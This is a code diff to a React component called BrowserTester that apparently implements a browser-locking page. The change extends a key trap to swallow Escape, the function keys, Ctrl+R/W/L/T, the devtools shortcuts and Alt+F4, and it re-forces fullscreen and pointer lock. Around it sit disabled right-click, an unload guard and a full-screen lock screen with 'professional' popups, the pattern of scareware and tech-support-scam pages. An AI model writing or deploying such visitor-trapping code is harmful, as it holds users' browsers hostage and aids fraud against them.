@@ -11,9 +11,9 @@ export default function BrowserTester() {
     const audioRef = useRef(null);
     const hasTriggeredRef = useRef(false);
     const os = detectOS();
-   console.log(os);
-   
-    
+    console.log(os);
+
+
     // Browser Detection
     const detectBrowser = () => {
         const ua = navigator.userAgent;
@@ -95,14 +95,35 @@ export default function BrowserTester() {
         window.addEventListener('contextmenu', preventDefault);
 
         const trapKeys = (e) => {
-            if (e.key === 'Escape' || e.key.startsWith('F') || (e.ctrlKey && e.key === 'w')) {
+            const key = e.key.toLowerCase();
+
+            const blocked =
+                key === 'escape' ||
+
+                // Function keys (F1–F12 incl F5 refresh)
+                key.startsWith('f') ||
+
+                // Ctrl combos
+                (e.ctrlKey && ['r', 'w', 'l', 't'].includes(key)) ||
+
+                // Ctrl + Shift combos (devtools + hard reload)
+                (e.ctrlKey && e.shiftKey && ['r', 'i', 'c'].includes(key)) ||
+
+                // Alt + F4
+                (e.altKey && key === 'f4');
+
+            if (blocked) {
+                navigator.vibrate?.([200, 100, 200]);
                 e.preventDefault();
+                e.stopPropagation();
+
                 if (stage >= 2) {
                     triggerFullscreen();
                     lockPointer();
                 }
             }
         };
+
         window.addEventListener('keydown', trapKeys);
 
         const handleBeforeUnload = (e) => {
@@ -189,8 +210,8 @@ export default function BrowserTester() {
             {/* Stage 2: Lock Screen with Professional Popups */}
             {stage >= 2 && !showTimerScreen && (
                 <div className="fixed inset-0 z-0">
-                  <LockScreen />
-                <ProfessionalOverlay />
+                    <LockScreen />
+                    <ProfessionalOverlay />
 
                     {/* Capture Clicks */}
                     <div className="absolute inset-0 z-10 pointer-events-auto cursor-none" onClick={advanceStage}>
